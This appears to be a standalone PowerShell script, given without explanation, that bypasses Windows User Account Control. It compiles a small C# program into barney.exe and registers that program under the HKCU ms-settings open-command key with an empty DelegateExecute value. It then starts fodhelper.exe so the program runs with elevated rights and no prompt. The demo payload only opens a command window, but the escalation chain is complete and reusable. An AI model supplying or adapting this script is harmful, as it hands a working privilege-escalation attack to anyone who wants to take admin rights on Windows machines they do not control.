$source = @"
using System.Diagnostics;
class Program {
    static void Main() {
        var psi = new ProcessStartInfo {
            FileName = "cmd.exe",
            Arguments = "/k echo Say Hello to admin rights", // /k keeps the window open
            UseShellExecute = true
        };
        Process.Start(psi);
    }
}
"@
    
$folderPath = "C:\myfolder"


if (-Not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
}

Add-Type -TypeDefinition $source -OutputAssembly "C:/myfolder/barney.exe" 

New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../myfolder/barney.exe"
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
Start-Process fodhelper.exe
